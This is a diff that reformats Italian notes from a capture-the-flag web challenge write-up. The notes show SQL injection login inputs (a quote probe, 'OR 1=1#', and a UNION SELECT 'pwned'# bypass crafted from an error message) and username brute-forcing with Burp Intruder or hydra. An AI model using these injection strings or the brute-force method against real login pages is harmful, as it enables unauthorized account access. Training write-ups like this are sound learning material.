@@ -4,16 +4,15 @@
 
 + Creare nuova pagina, viene chiesto login
 
-+ admin:password => 'Unknown user'
++ [username]admin [password]password => 'Unknown user'
 
-+ admin'sqltest:password => 'Traceback'
++ [username]admin'sqltest [password]password => 'Traceback'
 
 ![picture](imgs/1.png)
 
-+ admin' OR 1=1#:password => 'Invalid password' => quindi admin(true) e password(false)
++ [username]admin' OR 1=1# [password]password => 'Invalid password' => quindi admin(true) e password(false)
 
-+ admin= admin' UNION SELECT 'pwned'#  
-+ password= pwned   (craftata guardando la query nell'error)
++ [username]admin= admin' UNION SELECT 'pwned'# [password]password= pwned   (craftata guardando la query nell'error)
 
 + Flag si trova in una pagina che esce dopo aver loggato
 
@@ -29,8 +28,7 @@
 
 + Torno su login, admin' OR 1=1#:password => 'Invalid password' 
 
-+ admin = dipa' OR 1=1# 
-+ password= 'bruteforce con wordlist di username'
++ [username]admin = dipa' OR 1=1# [password]'bruteforce con wordlist di username'
 
 + Io l'ho fatto con intruder di burpsuite, può essere fatto anche con hydra o tool simili.
 
